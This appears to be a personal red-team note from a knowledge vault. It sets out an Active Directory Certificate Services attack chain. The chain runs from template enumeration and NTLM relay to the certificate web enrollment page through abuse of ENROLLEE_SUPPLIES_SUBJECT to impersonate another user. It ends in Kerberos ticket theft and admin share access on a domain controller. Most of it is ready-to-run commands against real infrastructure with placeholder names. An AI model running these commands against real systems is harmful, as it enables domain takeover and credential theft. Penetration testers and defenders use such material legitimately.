---
creation date: January 5th 2022
last modified date: January 5th 2022
aliases: []
tags: #📖
---

Primary Categories: [[01 - Operation]]
Secondary Categories:  [[02 - External]] - [[02 - Internal]]
Links: [[Privilege Escalation]]
Search Tag: #📖  

# [[ADCS]]  

## Enumeration 
### BOF 
https://github.com/trustedsec/CS-Situational-Awareness-BOF
```
adcs_enum
```

Review output for templates that have client authentication in the extended key usage where a non-admin pricipal has:
- `Enrollment` rights
- `WriteProperty` rights or the template enrollment flags contains name flags `ENROLLEE_SUPPLIES_SUBJECT`



## Reg Checks 
 ```cmd
certutil.exe -config "<CA.domain.gov>\<CA Service>" -getreg "policy\EditFlags"
``````
 
## Web Services
Force authentication from a machine to the web enrollment service of ADCS to enroll in a certificate template for the given machine account
```bash 
ntlmrelayx.py -t http://<CA>/certsrv/certfnsh.asp -smb2support --adcs --template DomainController # or any template 
```


## Certificate Analysis 
```bash 
export KRB5CCNAME=User.ccache
cat cert-names.txt | xargs -I {} /bin/bash -c "echo \"Analyzing {}\n\" && python3 modifyCertTemplate.py -get-acl -k -no-pass -template '{}' 'domain.com/User' | grep -A4 'Write' | grep -B4 -E '(Computers|Users)'"
```

### Escalation 
Enrollee_Supplies_Subject

#### Tools 
https://github.com/connormcgarr/tgtdelegation
https://github.com/zer1t0/certi
https://github.com/dirkjanm/PKINITtools

```bash
## Deprecated Don't use this 
# execute-assembly /share/Working/tools/Rubeus.exe tgtdeleg /nowrap
## use vim or text editor to paste tgt into flat file (<user>-tgt.kirbi.b64) and make sure no blank lines are added to the end of the file
# cat <user>-tgt.kirbi.b64 | base64 -d > <user>-tgt.kirbi
# impacket-ticketConverter <user>-tgt.kirbi <user>-tgt.ccache

# New hotness 
# Instead, load in the tgtdelegation bof mentioned above and run the following which will save a ccache file on disk in your home folder
tgtdeleg currentdomain default 

export KRB5CCNAME=/path/to/<user>-tgt.ccache 
proxychains python3 certi.py req domain.local/currentUser@ca.domain.local CA-NAME -k --no-pass --alt-name targetUsername --template TemplateName

proxychains python3 gettgtpkinit.py domain.local/targetUsername -dc-ip <dc-ip> targetUsername.ccache -cert-pfx /path/to/file.pfx -pfx-pass pfx-file-password 

export KRB5CCNAME=/tools/PKINITtools/da.ccache 
proxychains smbclient.py -k -no-pass -dc-ip <dc-ip> <domain.local>/<da>@<dc-ip-or-hostname>
# shares
# use c$
# ls 
```
___

## Resources:

| Hyperlink | Info |
| --------- | ---- |


Created Date: January 5th 2022 (02:26 pm)  
Last Modified Date: <%+tp.file.last_modified_date("MMMM Do YYYY (hh:ss a)")%>
